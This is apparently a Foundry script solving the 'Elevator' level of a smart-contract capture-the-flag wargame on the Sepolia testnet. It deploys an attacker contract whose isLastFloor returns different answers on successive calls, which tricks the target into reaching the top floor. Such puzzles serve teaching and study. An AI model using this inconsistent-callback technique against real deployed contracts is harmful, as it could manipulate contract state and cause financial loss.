// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Level11Elevator.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

// Objective: reach the top floor of the elevator by exploiting the isLastFloor function.

contract MyBuilding is Building {
    mapping(uint => bool) used;

    Elevator public elevator =
        Elevator(0x540599Ff4F25b53568811f52F69cd9f94384e534);

    function isLastFloor(uint256 n) external returns (bool) {
        if (!used[n]) {
            used[n] = true;
            return false;
        }
        return true;
    }

    function goTo(uint256 _floor) external {
        elevator.goTo(_floor);
    }
}

contract Level11Solution is Script {
    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        MyBuilding building = new MyBuilding();
        building.goTo(1);

        vm.stopBroadcast();
    }
}
// forge script script/Level11Solution.s.sol:Level11Solution --broadcast -vvvv --rpc-url sepolia --etherscan-api-key "${ETHERSCAN_API_KEY}"
